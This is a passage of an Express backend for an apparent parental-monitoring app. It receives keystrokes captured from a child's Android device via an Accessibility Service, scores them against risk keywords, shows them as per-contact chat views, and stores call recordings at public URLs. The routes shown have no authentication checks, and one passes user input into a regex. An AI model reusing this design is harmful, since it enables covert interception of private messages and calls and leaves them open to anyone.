    const result = await BrowserHistory.deleteMany({ deviceId: device.deviceId });

    console.log(`[Browser-History] Deleted ${result.deletedCount} entries for device ${device.name}`);

    res.json({
      success: true,
      deletedCount: result.deletedCount,
      message: `Deleted ${result.deletedCount} browser history entries`
    });
  } catch (error) {
    console.error('Delete browser history error:', error);
    res.status(500).json({ error: 'Failed to delete browser history' });
  }
});

// =============================================
// KEYSTROKE MONITORING ENDPOINTS
// =============================================

// Risk keywords for analysis (parent safety monitoring)
const RISK_KEYWORDS = {
  HIGH: [
    'suicide', 'kill myself', 'end my life', 'want to die', 'cutting', 'self harm',
    'drugs', 'overdose', 'cocaine', 'heroin', 'meth', 'dealer',
    'nude', 'naked', 'send pics', 'your body', 'meet up alone', 'dont tell anyone',
    'gun', 'weapon', 'knife', 'hurt someone'
  ],
  MEDIUM: [
    'bully', 'hate you', 'kill', 'fight', 'hurt', 'stupid', 'ugly',
    'alcohol', 'beer', 'drunk', 'wasted', 'high', 'smoke', 'vape',
    'sneak out', 'skip school', 'fake id', 'lie to parents',
    'depressed', 'anxious', 'scared', 'alone', 'nobody likes me'
  ]
};

// Analyze text for risk indicators
function analyzeRisk(text) {
  const lowerText = text.toLowerCase();
  const flaggedKeywords = [];
  
  // Check HIGH risk keywords
  for (const keyword of RISK_KEYWORDS.HIGH) {
    if (lowerText.includes(keyword.toLowerCase())) {
      flaggedKeywords.push(keyword);
    }
  }
  if (flaggedKeywords.length > 0) {
    return { riskLevel: 'HIGH', flaggedKeywords, sentiment: 'Negative' };
  }
  
  // Check MEDIUM risk keywords
  for (const keyword of RISK_KEYWORDS.MEDIUM) {
    if (lowerText.includes(keyword.toLowerCase())) {
      flaggedKeywords.push(keyword);
    }
  }
  if (flaggedKeywords.length > 0) {
    return { riskLevel: 'MEDIUM', flaggedKeywords, sentiment: 'Negative' };
  }
  
  // Basic sentiment analysis
  const positiveWords = ['love', 'happy', 'great', 'awesome', 'thanks', 'good', 'fun', 'excited'];
  const negativeWords = ['sad', 'angry', 'mad', 'upset', 'bad', 'hate', 'worried'];
  
  let positiveCount = 0;
  let negativeCount = 0;
  
  for (const word of positiveWords) {
    if (lowerText.includes(word)) positiveCount++;
  }
  for (const word of negativeWords) {
    if (lowerText.includes(word)) negativeCount++;
  }
  
  const sentiment = positiveCount > negativeCount ? 'Positive' : 
                   negativeCount > positiveCount ? 'Negative' : 'Neutral';
  
  return { riskLevel: 'LOW', flaggedKeywords: [], sentiment };
}

// DEBUG: Check keystroke status for device
router.get('/keystrokes/debug/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    // Find device
    let device = null;
    if (mongoose.Types.ObjectId.isValid(deviceId)) {
      device = await Device.findById(deviceId);
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceId });
    }
    
    if (!device) {
      return res.json({
        found: false,
        searchedId: deviceId,
        message: 'Device not found',
        hint: 'The deviceId might be wrong or device needs to be re-paired'
      });
    }
    
    // Count keystroke sessions
    const totalSessions = await KeystrokeSession.countDocuments({ deviceId: device.deviceId });
    const sessions = await KeystrokeSession.find({ deviceId: device.deviceId })
      .sort({ lastMessageTime: -1 })
      .limit(5)
      .select('sessionId appName contactName messageCount lastMessageTime riskLevel');
    
    res.json({
      found: true,
      device: {
        mongoId: device._id.toString(),
        androidId: device.deviceId,
        name: device.name
      },
      keystrokeStats: {
        totalSessions,
        recentSessions: sessions.map(s => ({
          sessionId: s.sessionId.substring(0, 8) + '...',
          app: s.appName,
          contact: s.contactName,
          messages: s.messageCount,
          lastTime: s.lastMessageTime,
          risk: s.riskLevel
        }))
      },
      hints: totalSessions === 0 ? [
        'No keystrokes captured yet',
        'Make sure Accessibility Service is enabled on child device',
        'Open Settings > Accessibility > FamilyGuard and enable it',
        'Type in any messaging app to test keystroke capture'
      ] : []
    });
    
  } catch (error) {
    console.error('Keystroke debug error:', error);
    res.status(500).json({ error: error.message });
  }
});

// POST: Sync keystrokes from device
router.post('/keystrokes', async (req, res) => {
  try {
    const { deviceId, keystrokes } = req.body;
    
    if (!deviceId || !keystrokes || !Array.isArray(keystrokes)) {
      console.log('[Sync] Invalid keystroke request:', { deviceId: !!deviceId, keystrokes: Array.isArray(keystrokes) });
      return res.status(400).json({ error: 'deviceId and keystrokes array required' });
    }
    
    console.log(`[Sync] Received ${keystrokes.length} keystrokes from device ${deviceId.substring(0, 8)}...`);
    
    // Verify device exists
    let device = await Device.findOne({ deviceId: deviceId });
    if (!device && mongoose.Types.ObjectId.isValid(deviceId)) {
      device = await Device.findById(deviceId);
    }
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    // Group keystrokes by sessionId
    const sessionMap = new Map();
    
    for (const keystroke of keystrokes) {
      const { sessionId, timestamp, packageName, appName, contactName, textContent, fieldType } = keystroke;
      
      if (!sessionId || !textContent) continue;
      
      if (!sessionMap.has(sessionId)) {
        sessionMap.set(sessionId, {
          deviceId: device.deviceId,
          sessionId,
          appPackage: packageName,
          appName: appName || packageName,
          contactName: contactName || 'Unknown',
          messages: [],
          firstMessageTime: new Date(timestamp),
          lastMessageTime: new Date(timestamp)
        });
      }
      
      const session = sessionMap.get(sessionId);
      session.messages.push({
        timestamp: new Date(timestamp),
        text: textContent,
        fieldType: fieldType || 'text'
      });
      
      // Update time bounds
      const msgTime = new Date(timestamp);
      if (msgTime < session.firstMessageTime) session.firstMessageTime = msgTime;
      if (msgTime > session.lastMessageTime) session.lastMessageTime = msgTime;
    }
    
    // Process and save/update sessions
    let savedCount = 0;
    for (const [sessionId, sessionData] of sessionMap) {
      try {
        // Combine all message text for risk analysis
        const allText = sessionData.messages.map(m => m.text).join(' ');
        const { riskLevel, flaggedKeywords, sentiment } = analyzeRisk(allText);
        
        // Upsert session - merge new messages with existing
        const existingSession = await KeystrokeSession.findOne({ sessionId });
        
        if (existingSession) {
          // Append new messages
          existingSession.messages.push(...sessionData.messages);
          existingSession.messageCount = existingSession.messages.length;
          existingSession.lastMessageTime = sessionData.lastMessageTime;
          
          // Re-analyze combined text
          const combinedText = existingSession.messages.map(m => m.text).join(' ');
          const analysis = analyzeRisk(combinedText);
          existingSession.riskLevel = analysis.riskLevel;
          existingSession.flaggedKeywords = analysis.flaggedKeywords;
          existingSession.sentiment = analysis.sentiment;
          
          await existingSession.save();
        } else {
          // Create new session
          await KeystrokeSession.create({
            ...sessionData,
            messageCount: sessionData.messages.length,
            riskLevel,
            flaggedKeywords,
            sentiment
          });
        }
        
        savedCount++;
        
        // Log high-risk sessions for monitoring
        if (riskLevel === 'HIGH') {
          console.log(`[ALERT] High-risk keystroke session detected for device ${device.name}: ${flaggedKeywords.join(', ')}`);
        }
        
      } catch (error) {
        if (error.code !== 11000) { // Ignore duplicate key errors
          console.error(`Error saving session ${sessionId}:`, error.message);
        }
      }
    }
    
    console.log(`[Sync] Saved/updated ${savedCount} keystroke sessions`);
    
    res.json({ success: true, sessionsProcessed: savedCount });
    
  } catch (error) {
    console.error('Sync keystrokes error:', error);
    res.status(500).json({ error: 'Failed to sync keystrokes' });
  }
});

// GET: Retrieve keystroke sessions for a device
router.get('/keystrokes/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { 
      page = 1, 
      limit = 20, 
      app, 
      riskLevel, 
      contact,
      startDate,
      endDate 
    } = req.query;
    
    // Find device
    let device = null;
    if (mongoose.Types.ObjectId.isValid(deviceId)) {
      device = await Device.findById(deviceId);
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceId });
    }
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    // Build query
    const query = { deviceId: device.deviceId };
    
    if (app) {
      query.appPackage = app;
    }
    if (riskLevel) {
      query.riskLevel = riskLevel;
    }
    if (contact) {
      query.contactName = { $regex: contact, $options: 'i' };
    }
    if (startDate || endDate) {
      query.lastMessageTime = {};
      if (startDate) query.lastMessageTime.$gte = new Date(startDate);
      if (endDate) query.lastMessageTime.$lte = new Date(endDate);
    }
    
    const skip = (parseInt(page) - 1) * parseInt(limit);
    
    const sessions = await KeystrokeSession.find(query)
      .sort({ lastMessageTime: -1 })
      .skip(skip)
      .limit(parseInt(limit));
    
    const total = await KeystrokeSession.countDocuments(query);
    
    // Calculate stats
    const statsQuery = { deviceId: device.deviceId };
    const [stats] = await KeystrokeSession.aggregate([
      { $match: statsQuery },
      { $group: {
        _id: null,
        totalSessions: { $sum: 1 },
        totalMessages: { $sum: '$messageCount' },
        highRiskCount: { $sum: { $cond: [{ $eq: ['$riskLevel', 'HIGH'] }, 1, 0] } },
        mediumRiskCount: { $sum: { $cond: [{ $eq: ['$riskLevel', 'MEDIUM'] }, 1, 0] } }
      }}
    ]);
    
    res.json({
      success: true,
      sessions,
      total,
      page: parseInt(page),
      limit: parseInt(limit),
      stats: stats || {
        totalSessions: 0,
        totalMessages: 0,
        highRiskCount: 0,
        mediumRiskCount: 0
      }
    });
    
  } catch (error) {
    console.error('Get keystrokes error:', error);
    res.status(500).json({ error: 'Failed to get keystrokes' });
  }
});

// GET: Get keystroke statistics summary
router.get('/keystrokes/:deviceId/stats', async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    // Find device
    let device = null;
    if (mongoose.Types.ObjectId.isValid(deviceId)) {
      device = await Device.findById(deviceId);
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceId });
    }
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    // Aggregate stats
    const [stats] = await KeystrokeSession.aggregate([
      { $match: { deviceId: device.deviceId } },
      { $group: {
        _id: null,
        totalSessions: { $sum: 1 },
        totalMessages: { $sum: '$messageCount' },
        highRiskCount: { $sum: { $cond: [{ $eq: ['$riskLevel', 'HIGH'] }, 1, 0] } },
        mediumRiskCount: { $sum: { $cond: [{ $eq: ['$riskLevel', 'MEDIUM'] }, 1, 0] } }
      }}
    ]);
    
    // Get top apps
    const topApps = await KeystrokeSession.aggregate([
      { $match: { deviceId: device.deviceId } },
      { $group: {
        _id: '$appPackage',
        appName: { $first: '$appName' },
        sessionCount: { $sum: 1 },
        messageCount: { $sum: '$messageCount' }
      }},
      { $sort: { messageCount: -1 } },
      { $limit: 5 }
    ]);
    
    // Get recent high-risk sessions
    const highRiskSessions = await KeystrokeSession.find({
      deviceId: device.deviceId,
      riskLevel: 'HIGH'
    })
      .sort({ lastMessageTime: -1 })
      .limit(5)
      .select('appName contactName flaggedKeywords lastMessageTime');
    
    res.json({
      success: true,
      stats: stats || {
        totalSessions: 0,
        totalMessages: 0,
        highRiskCount: 0,
        mediumRiskCount: 0
      },
      topApps,
      highRiskSessions
    });
    
  } catch (error) {
    console.error('Get keystroke stats error:', error);
    res.status(500).json({ error: 'Failed to get keystroke stats' });
  }
});

// DELETE: Delete a single keystroke session
router.delete('/keystrokes/:deviceId/session/:sessionId', async (req, res) => {
  try {
    const { deviceId, sessionId } = req.params;
    
    // Find device
    let device = await Device.findOne({ deviceId: deviceId });
    if (!device && mongoose.Types.ObjectId.isValid(deviceId)) {
      device = await Device.findById(deviceId);
    }
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    const result = await KeystrokeSession.findOneAndDelete({ 
      sessionId: sessionId, 
      deviceId: device.deviceId 
    });
    
    if (!result) {
      return res.status(404).json({ error: 'Session not found' });
    }
    
    console.log(`[Keystrokes] Deleted session ${sessionId}`);
    res.json({ success: true, message: 'Session deleted' });
    
  } catch (error) {
    console.error('Delete keystroke session error:', error);
    res.status(500).json({ error: 'Failed to delete session' });
  }
});

// DELETE: Delete all keystroke sessions for a device
router.delete('/keystrokes/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    // Find device
    let device = await Device.findOne({ deviceId: deviceId });
    if (!device && mongoose.Types.ObjectId.isValid(deviceId)) {
      device = await Device.findById(deviceId);
    }
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    const result = await KeystrokeSession.deleteMany({ deviceId: device.deviceId });
    
    console.log(`[Keystrokes] Deleted all ${result.deletedCount} sessions for device ${device.name}`);
    res.json({ success: true, deleted: result.deletedCount });
    
  } catch (error) {
    console.error('Delete all keystrokes error:', error);
    res.status(500).json({ error: 'Failed to delete keystrokes' });
  }
});

// GET: Get keystrokes grouped by contact (WhatsApp-style chat view)
router.get('/keystrokes/:deviceId/grouped', async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    // Find device
    let device = await Device.findOne({ deviceId: deviceId });
    if (!device && mongoose.Types.ObjectId.isValid(deviceId)) {
      device = await Device.findById(deviceId);
    }
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    // Get all sessions grouped by contact and app
    const groupedData = await KeystrokeSession.aggregate([
      { $match: { deviceId: device.deviceId } },
      { $sort: { lastMessageTime: -1 } },
      { 
        $group: {
          _id: { app: '$appName', contact: '$contactName' },
          sessions: { 
            $push: {
              sessionId: '$sessionId',
              messages: '$messages',
              messageCount: '$messageCount',
              riskLevel: '$riskLevel',
              flaggedKeywords: '$flaggedKeywords',
              firstMessageTime: '$firstMessageTime',
              lastMessageTime: '$lastMessageTime'
            }
          },
          totalMessages: { $sum: '$messageCount' },
          lastActivity: { $max: '$lastMessageTime' },
          highestRisk: { $max: '$riskLevel' }
        }
      },
      { $sort: { lastActivity: -1 } }
    ]);
    
    // Transform to chat-friendly format
    const chats = groupedData.map(g => ({
      app: g._id.app,
      contact: g._id.contact,
      totalMessages: g.totalMessages,
      lastActivity: g.lastActivity,
      highestRisk: g.highestRisk,
      sessions: g.sessions.sort((a, b) => 
        new Date(b.lastMessageTime) - new Date(a.lastMessageTime)
      )
    }));
    
    res.json({
      success: true,
      chats,
      totalChats: chats.length
    });
    
  } catch (error) {
    console.error('Get grouped keystrokes error:', error);
    res.status(500).json({ error: 'Failed to get grouped keystrokes' });
  }
});

// ==========================================
// CALL RECORDING UPLOAD
// ==========================================

// POST /api/sync/call-recording
// Upload a call recording from device
router.post('/call-recording', callRecordingUpload.single('recording'), async (req, res) => {
  try {
    const deviceId = req.body.deviceId || req.headers['x-device-id'];
    
    if (!deviceId) {
      return res.status(400).json({ error: 'deviceId is required' });
    }
    
    // Verify device exists
    const device = await Device.findOne({ deviceId });
    if (!device) {
      // Clean up uploaded file
      if (req.file) fs.unlinkSync(req.file.path);
      return res.status(404).json({ error: 'Device not found' });
    }
    
    if (!req.file) {
      return res.status(400).json({ error: 'No recording file uploaded' });
    }
    
    const { phoneNumber, contactName, callType, duration, timestamp } = req.body;
    
    // Generate a public URL for the recording
    const baseUrl = process.env.BASE_URL || 'https://familyguard-backend-c2c9hkc8dwgzepdq.centralindia-01.azurewebsites.net';
    const fileUrl = `${baseUrl}/uploads/call-recordings/${req.file.filename}`;
    
    // Save to database
    const recording = new CallRecording({
      deviceId: deviceId,
      fileName: req.file.filename,
      fileUrl: fileUrl,
      fileSize: req.file.size,
      duration: parseInt(duration) || 0,
      phoneNumber: phoneNumber || 'Unknown',
      contactName: contactName || null,
      callType: callType || 'unknown',
      timestamp: timestamp ? new Date(parseInt(timestamp)) : new Date(),
      listened: false
    });
    
    await recording.save();
    
    console.log(`[Sync] Call recording saved: ${req.file.filename} from device ${deviceId}`);
    
    res.json({
      success: true,
      message: 'Call recording uploaded successfully',
      recordingId: recording._id.toString(),
      fileUrl: fileUrl
    });
    
  } catch (error) {
    console.error('[Sync] Call recording upload error:', error);
    // Clean up uploaded file on error
    if (req.file && fs.existsSync(req.file.path)) {
      fs.unlinkSync(req.file.path);
    }
    res.status(500).json({ error: 'Failed to upload call recording: ' + error.message });
  }
});

module.exports = router;
